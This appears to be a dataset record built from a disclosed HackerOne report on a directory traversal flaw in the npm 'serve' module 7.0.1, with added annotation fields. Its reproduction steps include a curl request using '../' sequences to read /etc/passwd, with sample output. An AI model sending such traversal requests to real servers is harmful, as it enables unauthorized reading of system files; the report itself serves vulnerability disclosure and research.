{
    "reported_to": "Node.js third-party modules",
    "reported_by": "tungpun ",
    "title": "[serve] Server Directory Traversal",
    "content": "\nI would like to report a Server Directory Traversal vulnerability in serve.\nIt allows reading local files on the target server.\nModule\nmodule name: serve\nversion: 7.0.1\nnpm page: https://www.npmjs.com/package/serve\nModule Description\nAssuming you would like to serve a static site, single page application or just a static file (no matter if on your device or on the local network), this package is just the right choice for you.\nIt behaves exactly like static deployments on Now, so it's perfect for developing your static project. Then, when it's time to push it into production, you deploy it.\nFurthermore, it also provides a neat interface for listing the directory's contents\nVulnerability\nSteps To Reproduce:\nInstall the module\n$ npm i serve\nStart the server\n$ ./node_modules/serve/bin/serve.js\nUsing the below request to access the file /etc/passwd on the target server:\nCode 518 Bytes\n1$ curl --path-as-is 'http://127.0.0.1:3000/../../../../../../etc/passwd'\n2##\n3# User Database\n4#\n5# Note that this file is consulted directly only when the system is running\n6# in single-user mode.  At other times this information is provided by\n7# Open Directory.\n8#\n9# See the opendirectoryd(8) man page for additional information about\n10# Open Directory.\n11##\n12nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\n13root:*:0:0:System Administrator:/var/root:/bin/sh\n14daemon:*:1:1:System Services:/var/root:/usr/bin/false\n15...\nSupporting Material/References:\nmacOS High Sierra 10.13.4\nnode v8.10.0\nnpm 6.1.0\ncurl 7.54.0\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nIt allows reading local files on the target server\n\n",
    "severity": [
        9.3,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Path Traversal"
    ],
    "screenshots": {},
    "disclosed_date": 1530535680,
    "report_url": "https://hackerone.com/reports/358645",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Install the module: $ npm i serve"
        ],
        [
            2,
            "Start the server: $ ./node_modules/serve/bin/serve.js"
        ],
        [
            3,
            "Use curl to access the file /etc/passwd on the target server: $ curl --path-as-is 'http://127.0.0.1:3000/../../../../../../etc/passwd'"
        ]
    ],
    "vuln_description": "The vulnerability is a Server Directory Traversal in the 'serve' module, allowing an attacker to read local files on the target server by manipulating the URL path to access files outside the intended directory.",
    "reason": "The attack is straightforward, involving a common directory traversal technique that does not require complex interactions or understanding of multiple components. The vulnerability is well-known and the steps to exploit it are simple and direct.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}